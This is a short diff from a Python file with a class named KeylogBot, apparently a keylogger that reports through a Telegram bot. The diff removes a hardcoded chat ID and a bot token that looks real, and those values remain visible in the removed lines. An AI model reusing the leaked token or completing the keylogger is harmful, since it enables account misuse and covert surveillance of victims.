@@ -5,8 +5,8 @@ import telepot
 from telepot.loop import MessageLoop
 import threading
 
-CHAT_ID = "-1001671507684"
-TOKEN = "5693252666:AAFTIvLT-3A6KSDiuGzHiL7kD0PyYa8g2jE"
+CHAT_ID = ""
+TOKEN = ""
 
 
 class KeylogBot:
